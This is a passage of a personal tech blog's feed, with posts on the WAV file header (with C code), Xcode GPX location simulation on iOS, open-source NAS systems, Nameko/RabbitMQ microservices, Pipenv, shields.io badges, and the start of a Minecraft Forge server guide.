href="#RIFF区块" class="headerlink" title="RIFF区块"></a>RIFF区块</h3><div class="table-container"><table><thead><tr><th>名称</th><th>偏移地址</th><th>字节数</th><th>端序</th><th>内容</th></tr></thead><tbody><tr><td>ID</td><td>0x00</td><td>4Byte</td><td>大端</td><td>‘RIFF’ (0x52494646)</td></tr><tr><td>Size</td><td>0x04</td><td>4Byte</td><td>小端</td><td>fileSize - 8</td></tr><tr><td>Type</td><td>0x08</td><td>4Byte</td><td>大端</td><td>‘WAVE’(0x57415645)</td></tr></tbody></table></div><pre><code class="lang-text">ID 以&#39;RIFF&#39;为标识Size 是整个文件的长度减去 ID 和 Size 的长度Type 是WAVE表示后面需要两个子块：Format 区块和 Data 区块</code></pre><h3 id="FORMAT区块"><a href="#FORMAT区块" class="headerlink" title="FORMAT区块"></a>FORMAT区块</h3><div class="table-container"><table><thead><tr><th>名称</th><th>偏移地址</th><th>字节数</th><th>端序</th><th>内容</th></tr></thead><tbody><tr><td>ID</td><td>0x00</td><td>4Byte</td><td>大端</td><td>‘fmt ‘ (0x666D7420)</td></tr><tr><td>Size</td><td>0x04</td><td>4Byte</td><td>小端</td><td>16</td></tr><tr><td>AudioFormat</td><td>0x08</td><td>2Byte</td><td>小端</td><td>音频格式</td></tr><tr><td>NumChannels</td><td>0x0A</td><td>2Byte</td><td>小端</td><td>声道数</td></tr><tr><td>SampleRate</td><td>0x0C</td><td>4Byte</td><td>小端</td><td>采样率</td></tr><tr><td>ByteRate</td><td>0x10</td><td>4Byte</td><td>小端</td><td>每秒数据字节数</td></tr><tr><td>BlockAlign</td><td>0x14</td><td>2Byte</td><td>小端</td><td>数据块对齐</td></tr><tr><td>BitsPerSample</td><td>0x16</td><td>2Byte</td><td>小端</td><td>采样位数</td></tr></tbody></table></div><pre><code class="lang-text">ID 以&#39;fmt &#39;为标识Size 表示该区块数据的长度（不包含 ID 和 Size 的长度）AudioFormat 表示 Data 区块存储的音频数据的格式，PCM音频数据的值为1NumChannels 表示音频数据的声道数，1：单声道，2：双声道SampleRate 表示音频数据的采样率ByteRate 每秒数据字节数 = SampleRate * NumChannels * BitsPerSample / 8BlockAlign 每个采样所需的字节数 = NumChannels * BitsPerSample / 8BitsPerSample 每个采样存储的bit数，8：8bit，16：16bit，32：32bit</code></pre><h3 id="DATA区块"><a href="#DATA区块" class="headerlink" title="DATA区块"></a>DATA区块</h3><div class="table-container"><table><thead><tr><th>名称</th><th>偏移地址</th><th>字节数</th><th>端序</th><th>内容</th></tr></thead><tbody><tr><td>ID</td><td>0x00</td><td>4Byte</td><td>大端</td><td>‘data’ (0x64617461)</td></tr><tr><td>Size</td><td>0x04</td><td>4Byte</td><td>小端</td><td>N</td></tr><tr><td>Data</td><td>0x08</td><td>NByte</td><td>小端</td><td>音频数据</td></tr></tbody></table></div><pre><code class="lang-text">ID 以&#39;data&#39;为标识Size 表示音频数据的长度，N = ByteRate * secondsData 音频数据</code></pre><h2 id="小端存储"><a href="#小端存储" class="headerlink" title="小端存储"></a>小端存储</h2><blockquote><p>所谓的大端模式，是指数据的低位保存在内存的高地址中，而数据的高位，保存在内存的低地址中；<br>  所谓的小端模式，是指数据的低位保存在内存的低地址中，而数据的高位保存在内存的高地址中。</p></blockquote><p>下面解释一下 PCM 数据在 WAV 文件中的 bit 位排列方式</p><div class="table-container"><table><thead><tr><th>PCM数据类型</th><th>采样</th><th>采样</th></tr></thead><tbody><tr><td>8Bit 单声道</td><td>声道0</td><td>声道0</td></tr><tr><td>8Bit 双声道</td><td>声道0</td><td>声道1</td></tr><tr><td>16Bit 单声道</td><td>声道0低位，声道0高位</td><td>声道0低位，声道0高位</td></tr><tr><td>16Bit 双声道</td><td>声道0低位，声道0高位</td><td>声道1低位，声道1高位</td></tr></tbody></table></div><h2 id="示例代码-C"><a href="#示例代码-C" class="headerlink" title="示例代码 (C)"></a>示例代码 (C)</h2><pre><code class="lang-c">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;struct WAV_Format {    // riff header    uint32_t ChunkID;        // &quot;RIFF&quot;    uint32_t ChunkSize;      // 36 + Subchunk2Size    uint32_t Format;         // &quot;WAVE&quot;    // sub-chunk &quot;fmt&quot;    uint32_t Subchunk1ID;    // &quot;fmt &quot; */    uint32_t Subchunk1Size;  // 16 for PCM */    uint16_t AudioFormat;    // PCM = 1*/    uint16_t NumChannels;    // Mono = 1, Stereo = 2, etc.    uint32_t SampleRate;     // 8000, 44100, etc.    uint32_t ByteRate;       // = SampleRate * NumChannels * BitsPerSample/8    uint16_t BlockAlign;     // = NumChannels * BitsPerSample/8    uint16_t BitsPerSample;  // 8bits, 16bits, etc.    // sub-chunk &quot;data&quot;    uint32_t Subchunk2ID;    // &quot;data&quot;    uint32_t Subchunk2Size;  // data size};int main(void) {    FILE *fp = NULL;    struct WAV_Format wav;    fp = fopen(&quot;output_1.wav&quot;, &quot;rb&quot;);    if (!fp) {        printf(&quot;can&#39;t open audio file\n&quot;);        exit(1);    }    fread(&amp;wav, 1, sizeof(struct WAV_Format), fp);    printf(&quot;ChunkID \t%x\n&quot;, wav.ChunkID);    printf(&quot;ChunkSize \t%d\n&quot;, wav.ChunkSize);    printf(&quot;Format \t\t%x\n&quot;, wav.Format);    printf(&quot;Subchunk1ID \t%x\n&quot;, wav.Subchunk1ID);    printf(&quot;Subchunk1Size \t%d\n&quot;, wav.Subchunk1Size);    printf(&quot;AudioFormat \t%d\n&quot;, wav.AudioFormat);    printf(&quot;NumChannels \t%d\n&quot;, wav.NumChannels);    printf(&quot;SampleRate \t%d\n&quot;, wav.SampleRate);    printf(&quot;ByteRate \t%d\n&quot;, wav.ByteRate);    printf(&quot;BlockAlign \t%d\n&quot;, wav.BlockAlign);    printf(&quot;BitsPerSample \t%d\n&quot;, wav.BitsPerSample);    printf(&quot;Subchunk2ID \t%x\n&quot;, wav.Subchunk2ID);    printf(&quot;Subchunk2Size \t%d\n&quot;, wav.Subchunk2Size);    fclose(fp);    return 0;}</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://www.jianshu.com/p/947528f3dff8" target="_blank" rel="noopener">WAV文件格式详解 - 简书</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Programming" scheme="https://vincentstudio.info/categories/Programming/"/>
    
    
      <category term="Audio" scheme="https://vincentstudio.info/tags/Audio/"/>
    
  </entry>
  
  <entry>
    <title>How to Fake a GPS Location on IOS</title>
    <link href="https://vincentstudio.info/2019/05/03/028%20How%20to%20Fake%20a%20GPS%20Location%20on%20IOS/"/>
    <id>https://vincentstudio.info/2019/05/03/028 How to Fake a GPS Location on IOS/</id>
    <published>2019-05-03T02:00:00.000Z</published>
    <updated>2019-05-03T03:01:43.771Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p><code>IPhone X</code><br><code>System: IOS 12.2</code></p><p><code>MacBook Pro 2018</code><br><code>System: macOS Mojave 10.14.4</code><br><code>IDE: Xcode v10.2</code></p><h2 id="Quick-Guide"><a href="#Quick-Guide" class="headerlink" title="Quick Guide"></a>Quick Guide</h2><h3 id="Create-Project"><a href="#Create-Project" class="headerlink" title="Create Project"></a>Create Project</h3><p>Open your Xcode and Create a new <span class="highlight">Single View App</span> project.</p><img src="/images/loading.gif" data-original="/2019/05/03/028%20How%20to%20Fake%20a%20GPS%20Location%20on%20IOS/create_project.png"><h3 id="Get-GPS-Location"><a href="#Get-GPS-Location" class="headerlink" title="Get GPS Location"></a>Get GPS Location</h3><p><a href="http://www.gpsspg.com/maps.htm" target="_blank" rel="noopener">http://www.gpsspg.com/maps.htm</a></p><p>Demo: 清华大学 (40.0033348446,116.3261745921)</p><img src="/images/loading.gif" data-original="/2019/05/03/028%20How%20to%20Fake%20a%20GPS%20Location%20on%20IOS/gps.png"><h3 id="Add-a-gpx-file"><a href="#Add-a-gpx-file" class="headerlink" title="Add a gpx file"></a>Add a gpx file</h3><p>Replace the latitude and longitude of the location you choose</p><img src="/images/loading.gif" data-original="/2019/05/03/028%20How%20to%20Fake%20a%20GPS%20Location%20on%20IOS/add_gpx.png"><pre><code class="lang-xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;gpx version=&quot;1.1&quot; creator=&quot;Xcode&quot;&gt;    &lt;wpt lat=&quot;40.0033348446&quot; lon=&quot;116.326174592&quot;&gt;        &lt;name&gt;清华大学&lt;/name&gt;        &lt;time&gt;2014-09-24T14:55:37Z&lt;/time&gt;    &lt;/wpt&gt;&lt;/gpx&gt;</code></pre><h3 id="Edit-Scheme"><a href="#Edit-Scheme" class="headerlink" title="Edit Scheme"></a>Edit Scheme</h3><p>Choose Your Project &gt; Edit Scheme &gt; Options<br>Check <span class="highlight">Allow Location Simulation</span> and set <span class="highlight">Default Location</span> to your gpx file</p><img src="/images/loading.gif" data-original="/2019/05/03/028%20How%20to%20Fake%20a%20GPS%20Location%20on%20IOS/edit_scheme.png"><h3 id="Connect-IPhone-and-Run-Debug"><a href="#Connect-IPhone-and-Run-Debug" class="headerlink" title="Connect IPhone and Run Debug"></a>Connect IPhone and Run Debug</h3><p>Perfect!</p><img src="/images/loading.gif" data-original="/2019/05/03/028%20How%20to%20Fake%20a%20GPS%20Location%20on%20IOS/phone.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Programming" scheme="https://vincentstudio.info/categories/Programming/"/>
    
    
      <category term="IOS" scheme="https://vincentstudio.info/tags/IOS/"/>
    
  </entry>
  
  <entry>
    <title>A list of Open Source NAS Operating System</title>
    <link href="https://vincentstudio.info/2019/05/02/027%20A%20list%20of%20Open%20Source%20NAS%20Operating%20System/"/>
    <id>https://vincentstudio.info/2019/05/02/027 A list of Open Source NAS Operating System/</id>
    <published>2019-05-02T12:00:00.000Z</published>
    <updated>2019-05-02T13:05:41.703Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="FreeNAS"><a href="#FreeNAS" class="headerlink" title="FreeNAS"></a><a href="http://www.freenas.org" target="_blank" rel="noopener">FreeNAS</a></h2><p>目前最受欢迎的开源免费 NAS 操作系统之一，基于以安全和稳定著称的 FreeBSD 系统开发，由 ixsystems 公司的技术团队维护。</p><img src="/images/loading.gif" data-original="/2019/05/02/027%20A%20list%20of%20Open%20Source%20NAS%20Operating%20System/Freenas.png"><h2 id="NAS4Free"><a href="#NAS4Free" class="headerlink" title="NAS4Free"></a><a href="http://www.nas4free.org" target="_blank" rel="noopener">NAS4Free</a></h2><p>基于 FreeNAS 0.7 开发的一个分支，由原 FreeNAS 系统开发者发起创建。许多恋旧的朋友忠实的跟随，安装要求没有 FreeNAS 高，版本更新也很及时。</p><img src="/images/loading.gif" data-original="/2019/05/02/027%20A%20list%20of%20Open%20Source%20NAS%20Operating%20System/nas4free.jpg"><h2 id="OpenMediaVault"><a href="#OpenMediaVault" class="headerlink" title="OpenMediaVault"></a><a href="http://www.openmediavault.org/" target="_blank" rel="noopener">OpenMediaVault</a></h2><p>由原 FreeNAS 核心开发成员 Volker Theile 发起的基于 Debian Linux 的开源 NAS 操作系统，主要面向家庭用户和小型办公环境，最近发布了针对树莓派的安装包，值得关注。</p><img src="/images/loading.gif" data-original="/2019/05/02/027%20A%20list%20of%20Open%20Source%20NAS%20Operating%20System/openmediavault.png"><h2 id="Openfiler"><a href="#Openfiler" class="headerlink" title="Openfiler"></a><a href="http://www.openfiler.com/" target="_blank" rel="noopener">Openfiler</a></h2><p>另一款基于浏览器管理的开源 NAS 操作系统，许多人说他好用，因为它基于 rPath Linux 开发。2013年以后，这款 NAS 系统的开源版本再没有更新。</p><img src="/images/loading.gif" data-original="/2019/05/02/027%20A%20list%20of%20Open%20Source%20NAS%20Operating%20System/openfiler.jpg"><h2 id="NexentaStor"><a href="#NexentaStor" class="headerlink" title="NexentaStor"></a><a href="http://www.nexentastor.org/" target="_blank" rel="noopener">NexentaStor</a></h2><p>基于 OpenSolaris 开发，与 FreeNAS 一样采用强大的 ZFS 文件系统。该系统由 Nexenta Systems 公司技术团队维护，同时提供社区开原版和商业付费版本，社区开原版有 18TB 的存储容量限制，有人说 NexentaStor 比 OpenFiler 好用。</p><img src="/images/loading.gif" data-original="/2019/05/02/027%20A%20list%20of%20Open%20Source%20NAS%20Operating%20System/nexentastor.jpg"><h2 id="RockStor"><a href="#RockStor" class="headerlink" title="RockStor"></a><a href="http://www.rockstor.com/" target="_blank" rel="noopener">RockStor</a></h2><p>一款基于 Linux 的开源 NAS 系统，采用企业级文件系统 BTRFS，提供 SMB/CIFS、NFS  以及 SFTP 常见的共享方式。第一个 ISO 镜像发布于 2014-10-02，可见这套 NAS 系统初出茅庐，暂无简体中文支持。不过官网文档已经备齐，保持关注，可能有一番作为。</p><img src="/images/loading.gif" data-original="/2019/05/02/027%20A%20list%20of%20Open%20Source%20NAS%20Operating%20System/rockstor.jpg"><h2 id="EasyNAS"><a href="#EasyNAS" class="headerlink" title="EasyNAS"></a><a href="http://www.easynas.org/" target="_blank" rel="noopener">EasyNAS</a></h2><p>另一款非常年轻的 NAS 系统，与 RockStor 很像，同样采用企业级文件系统 BTRFS，但官方网站和文档会略逊一筹，第一个 ISO 镜像发布于 2014-05-10。</p><img src="/images/loading.gif" data-original="/2019/05/02/027%20A%20list%20of%20Open%20Source%20NAS%20Operating%20System/EasyNAS.jpg"><h2 id="Webmin"><a href="#Webmin" class="headerlink" title="Webmin"></a><a href="http://www.webmin.cn/" target="_blank" rel="noopener">Webmin</a></h2><p>它不是 NAS 操作系统，但可以实现基本的 samba 共享功能，webmin 是目前功能最强大的基于浏览器的 Unix 系统管理工具。可以安装在几乎所有的类 Unix 操作系统上面。特别适合刚入门的用户管理 Linux 服务器。</p><img src="/images/loading.gif" data-original="/2019/05/02/027%20A%20list%20of%20Open%20Source%20NAS%20Operating%20System/Webmin.png"><h2 id="GlusterFS"><a href="#GlusterFS" class="headerlink" title="GlusterFS"></a><a href="http://www.gluster.org/" target="_blank" rel="noopener">GlusterFS</a></h2><p>由 Z RESEARCH 公司负责开发，最近非常活跃。 文档也比较齐全，不难上手。GlusterFS 通过 Infiniband RDMA 或 TCP/IP 协议将多台廉价的 x86 主机，通过网络互联成一个并行的网络文件系统。据说 Gluster 已被 RedHat 收购。</p><h2 id="Lustre"><a href="#Lustre" class="headerlink" title="Lustre"></a><a href="http://lustre.org/" target="_blank" rel="noopener">Lustre</a></h2><p>为解决海量存储问题而设计的全新文件系统。是下一代的集群文件系统，可支持10,000个节点，PB的存储量，100GB/S的传输速度，完美的安全性和可管理性。 目前Lustre已经运用在一些领域，例如HP SFS产品等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Resources" scheme="https://vincentstudio.info/categories/Resources/"/>
    
    
      <category term="NAS" scheme="https://vincentstudio.info/tags/NAS/"/>
    
  </entry>
  
  <entry>
    <title>Use Nameko + RabbitMQ to establish your Microservices</title>
    <link href="https://vincentstudio.info/2019/04/24/026%20Use%20Nameko%20+%20RabbitMQ%20to%20establish%20your%20Microservices/"/>
    <id>https://vincentstudio.info/2019/04/24/026 Use Nameko + RabbitMQ to establish your Microservices/</id>
    <published>2019-04-24T03:00:00.000Z</published>
    <updated>2019-05-18T13:39:59.417Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>Nameko is a microservices framework for Python that lets service developers concentrate on application logic and encourages testability.</p></blockquote><img src="/images/loading.gif" data-original="/2019/04/24/026%20Use%20Nameko%20+%20RabbitMQ%20to%20establish%20your%20Microservices/nameko.png"><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><p>According to official documentation:</p><blockquote><p>It comes with built-in support for:</p><ul><li>RPC over AMQP</li><li>Asynchronous events (pub-sub) over AMQP</li><li>Simple HTTP GET and POST</li><li>Websocket RPC and subscriptions (experimental)</li></ul></blockquote><p>As I know, It can also respond to grpc requests by using <a href="https://github.com/nameko/nameko-grpc" target="_blank" rel="noopener">nameko-grpc</a> extension. </p><h2 id="Quick-Guide"><a href="#Quick-Guide" class="headerlink" title="Quick Guide"></a>Quick Guide</h2><h3 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h3><p>Nameko use RabbitMQ as a message-oriented middleware. We can easily create a rabbitmq environment by docker. You can read my previous post <a href="/2018/12/09/003%20RabbitMQ%20Installation/"><code>《RabbitMQ Installation》</code></a> for more details.</p><pre><code class="lang-yaml"># docker-compose.ymlversion: &quot;2&quot;services:  bitbucket:    image: &quot;rabbitmq:management&quot;    container_name: rabbitmq    restart: always    ports:      - &quot;5672:5672&quot;      - &quot;15672:15672&quot;</code></pre><p>OR:</p><pre><code class="lang-bash">$ docker run -d --name rabbitmq \-p 15672:15672 -p 5672:5672 \rabbitmq:3-management</code></pre><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><p>Here I use pipenv to install nameko. Pipenv is a package manager for python. You can read my last post <a href="/2019/04/13/025%20Pipenv%20Tutorial/"><code>《 Pipenv Tutorial 》</code></a> about its feature, advantages and usage.</p><pre><code class="lang-$xslt">$ pipenv install nameko</code></pre><h3 id="Create-a-Service"><a href="#Create-a-Service" class="headerlink" title="Create a Service"></a>Create a Service</h3><pre><code class="lang-python"># myservice.py# -*- coding: UTF-8 -*-import osimport gensimimport numpy as npimport jiebafrom scipy.linalg import normfrom nameko.rpc import rpcBASE_DIR = os.path.abspath(os.path.dirname(__file__))MODEL_PATH = os.path.join(BASE_DIR, &quot;data/news_12g_baidubaike_20g_novel_90g_embedding_64.bin&quot;)model = gensim.models.KeyedVectors.load_word2vec_format(MODEL_PATH, binary=True)def get_sentence_vector(s):    words = jieba.lcut(s)    sentence_vector = np.zeros(64)    word_num = 0    for word in words:        try:            word_vec = model.get_vector(word)            sentence_vector += word_vec            word_num += 1        except KeyError:            pass    sentence_vector /= word_num    return sentence_vectordef get_sentence_similarity(s1, s2):    v1, v2 = get_sentence_vector(s1), get_sentence_vector(s2)    return np.dot(v1, v2) / (norm(v1) * norm(v2))class RPCService:    name = &quot;sentence_similarity&quot;    @rpc    def compute(self, s1, s2):        return get_sentence_similarity(s1, s2)</code></pre><p>It’s a service to calculate the similarity of sentence in Chinese. You can just ignore the implementation of the compute function and focus on the service part.</p><pre><code class="lang-python">class RPCService:    name = &quot;sentence_similarity&quot;    @rpc    def compute(self, s1, s2):        return get_sentence_similarity(s1, s2)</code></pre><p>It’s really concise, isn’t it? All you need to do is define the service name and add a rpc decorator to your method. You don’t have to care about how to communicate to your broker and how to serialize or deserialize your data. You don’t even need to define your data structure like protobuf and grpc do.</p><h3 id="Start-your-service"><a href="#Start-your-service" class="headerlink" title="Start your service"></a>Start your service</h3><pre><code class="lang-bash">$ nameko run [service_name] --broker [broker_uri]</code></pre><p>For this case </p><pre><code class="lang-bash">$ nameko run service --broker amqp://guest:guest@localhost:5672# 5672 is the default amqp port for rabbitmq&quot;&quot;&quot; Returnsstarting services: sentence_similarityConnected to amqp://guest:**@127.0.0.1:5672//&quot;&quot;&quot;</code></pre><h3 id="How-to-Invoke-Client"><a href="#How-to-Invoke-Client" class="headerlink" title="How to Invoke? (Client)"></a>How to Invoke? (Client)</h3><p>You can easily test your service by nameko shell</p><pre><code class="lang-bash">$ nameko shell --broker amqp://guest:guest@localhost:5672Nameko Python 3.7.1 (default, Apr 23 2019, 06:16:09) [Clang 10.0.0 (clang-1000.11.45.5)] shell on darwinBroker: amqp://guest:guest@localhost:5672&gt;&gt;&gt; n.rpc.sentence_similarity.compute(&quot;晚上吃了么&quot;, &quot;今晚吃了什么&quot;)0.8222975682337561&gt;&gt;&gt; n.rpc.sentence_similarity.compute(&quot;晚上吃了么&quot;, &quot;今天天气不错&quot;)0.2270335911019851</code></pre><p>You can also invoke your service by ClusterRpcProxy without any data structure definition and it looks like a synchronous method. It also has asynchronous calling methods.</p><pre><code class="lang-python">from nameko.standalone.rpc import ClusterRpcProxybroker_cfg = {&#39;AMQP_URI&#39;: &quot;amqp://guest:guest@localhost&quot;}def get_sentence_similarity(s1, s2):    with ClusterRpcProxy(broker_cfg) as rpc:        result = rpc.sentence_similarity.compute(s1, s2)        return resultif __name__ == &quot;__main__&quot;:    print(get_sentence_similarity(&quot;今天吃了么&quot;, &quot;今天吃什么&quot;))</code></pre><h2 id="Other-Protocols-support"><a href="#Other-Protocols-support" class="headerlink" title="Other Protocols support"></a>Other Protocols support</h2><p>It also supports http protocol.</p><pre><code class="lang-python"># http_service.py# -*- coding: UTF-8 -*-import jsonfrom nameko.web.handlers import httpclass HttpService:    name = &quot;http_service&quot;    @http(&#39;GET&#39;, &#39;/get/&lt;int:value&gt;&#39;)    def get_method(self, request, value):        return json.dumps({&#39;value&#39;: value})    @http(&#39;POST&#39;, &#39;/post&#39;)    def do_post(self, request):        return u&quot;received: {}&quot;.format(request.get_data(as_text=True))</code></pre><p>Or grpc, <a href="https://github.com/nameko/nameko-grpc" target="_blank" rel="noopener">nameko-grpc</a>. Just read the docs.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://www.nameko.io/" target="_blank" rel="noopener">Nameko official website</a><br>[2] <a href="https://docs.nameko.io/en/stable/" target="_blank" rel="noopener">Nameko 2.11.0 documentation</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Programming" scheme="https://vincentstudio.info/categories/Programming/"/>
    
    
      <category term="Python" scheme="https://vincentstudio.info/tags/Python/"/>
    
      <category term="RPC" scheme="https://vincentstudio.info/tags/RPC/"/>
    
      <category term="Microservices" scheme="https://vincentstudio.info/tags/Microservices/"/>
    
  </entry>
  
  <entry>
    <title>Pipenv Tutorial</title>
    <link href="https://vincentstudio.info/2019/04/13/025%20Pipenv%20Tutorial/"/>
    <id>https://vincentstudio.info/2019/04/13/025 Pipenv Tutorial/</id>
    <published>2019-04-13T14:00:00.000Z</published>
    <updated>2019-04-18T23:55:27.450Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>Like npm, pipenv is the officially recommended Python packaging tool from Python.org.</p></blockquote><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><h3 id="For-MacOS"><a href="#For-MacOS" class="headerlink" title="For MacOS"></a>For MacOS</h3><pre><code class="lang-bash">$ brew install pipenv$ echo &#39;export PIPENV_VENV_IN_PROJECT=1&#39; &gt;&gt; ~/.zshrc# or ~/.basrc depends on your shell</code></pre><h3 id="For-Ubuntu"><a href="#For-Ubuntu" class="headerlink" title="For Ubuntu"></a>For Ubuntu</h3><pre><code class="lang-bash">$ sudo apt install pipenv$ echo &#39;export PIPENV_VENV_IN_PROJECT=1&#39; &gt;&gt; ~/.zshrc</code></pre><h2 id="Quick-guide"><a href="#Quick-guide" class="headerlink" title="Quick guide"></a>Quick guide</h2><h3 id="Create-virtual-environment"><a href="#Create-virtual-environment" class="headerlink" title="Create virtual environment"></a>Create virtual environment</h3><pre><code class="lang-bash"># for python3$ pipenv --three# for python2$ pipenv --two</code></pre><img src="/images/loading.gif" data-original="/2019/04/13/025%20Pipenv%20Tutorial/create_virtualenv.gif"><h3 id="Enter-virtual-environment"><a href="#Enter-virtual-environment" class="headerlink" title="Enter virtual environment"></a>Enter virtual environment</h3><pre><code class="lang-bash">$ pipenv shell</code></pre><p>It’s the same as ‘source venv/bin/active’</p><h3 id="Install-packages"><a href="#Install-packages" class="headerlink" title="Install packages"></a>Install packages</h3><pre><code class="lang-bash">$ pipenv install flask numpy$ pipenv install pytest --dev</code></pre><img src="/images/loading.gif" data-original="/2019/04/13/025%20Pipenv%20Tutorial/install.gif"><h3 id="Check-out-packge"><a href="#Check-out-packge" class="headerlink" title="Check out packge"></a>Check out packge</h3><pre><code class="lang-bash">$ pipenv graph</code></pre><img src="/images/loading.gif" data-original="/2019/04/13/025%20Pipenv%20Tutorial/graph.png"><p>It’s like ‘pip list’ but more friendly</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://pipenv.readthedocs.io/en/latest/" target="_blank" rel="noopener">Pipenv: Python Dev Workflow for Humans</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Programming" scheme="https://vincentstudio.info/categories/Programming/"/>
    
    
      <category term="Python" scheme="https://vincentstudio.info/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Add bandages to your markdown</title>
    <link href="https://vincentstudio.info/2019/04/10/024%20Add%20bandages%20to%20your%20markdown/"/>
    <id>https://vincentstudio.info/2019/04/10/024 Add bandages to your markdown/</id>
    <published>2019-04-10T05:00:00.000Z</published>
    <updated>2019-04-10T05:39:40.354Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>Do you know how to add these remarkable bandages to your markdown?</p></blockquote><p><embed src="https://img.shields.io/badge/version-v0.1.2-brightgreen.svg"><embed src="https://img.shields.io/badge/author-vincent-lightgrey.svg"><embed src="https://img.shields.io/badge/license-MIT-green.svg"><embed src="https://img.shields.io/badge/python-3.6%20%7C%203.7-blue.svg"></p><h2 id="Static"><a href="#Static" class="headerlink" title="Static"></a>Static</h2><p>You can easily create a bandage by the following code</p><pre><code class="lang-text">![](https://img.shields.io/badge/{label}-{message}-{color}.svg)&#39;&#39;&#39;Parameters:  label: string  message: string  color: optional    - &quot;brightgreen&quot;    - &quot;green&quot;    - &quot;yellowgreen&quot;    - &quot;yellow&quot;    - &quot;orange&quot;    - &quot;red&quot;    - &quot;lightgrey&quot;    - &quot;blue&quot;&#39;&#39;&#39;</code></pre><p>Here is the demo</p><pre><code class="lang-markdown">![](https://img.shields.io/badge/hello-vincent-orange.svg)</code></pre><embed src="https://img.shields.io/badge/hello-vincent-orange.svg"><h2 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h2><p>You can also optimise styles or create a dynamic bandage by json/xml/yaml endpoint. Here is the official tutorial.</p><p><a href="https://shields.io/" target="_blank" rel="noopener">https://shields.io/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Programming" scheme="https://vincentstudio.info/categories/Programming/"/>
    
    
      <category term="Markdown" scheme="https://vincentstudio.info/tags/Markdown/"/>
    
  </entry>
  
  <entry>
    <title>Deploy a minecraft server using forge</title>
    <link href="https://vincentstudio.info/2019/04/03/023%20Deploy%20a%20minecraft%20server%20using%20forge/"/>
    <id>https://vincentstudio.info/2019/04/03/023 Deploy a minecraft server using forge/</id>
    <published>2019-04-03T13:00:00.000Z</published>
    <updated>2019-04-03T14:39:42.806Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>Here I use v1.12.2 for demonstration. You can choose any version you like. </p></blockquote><h2 id="Download-Forge-Installer"><a href="#Download-Forge-Installer" class="headerlink" title="Download Forge Installer"></a>Download Forge Installer</h2><p><a href="https://files.minecraftforge.net/maven/net/minecraftforge/forge/index_1.12.2.html" target="_blank" rel="noopener">https://files.minecraftforge.net/maven/net/minecraftforge/forge/index_1.12.2.html</a><br><img src="/images/loading.gif" data-original="/2019/04/03/023%20Deploy%20a%20minecraft%20server%20using%20forge/download_forge.png"></p><h2 id="Install-Server"><a href="#Install-Server" class="headerlink" title="Install Server"></a>Install Server</h2><pre><code class="lang-bash">$ java -jar forge-1.12.2-14.23.5.2768-installer.jar nogui --installServer</code></pre><p>You can delete ‘forge-1.12.2-14.23.5.2768-installer.jar’ after installation </p><h2 id="Run-Server"><a href="#Run-Server" 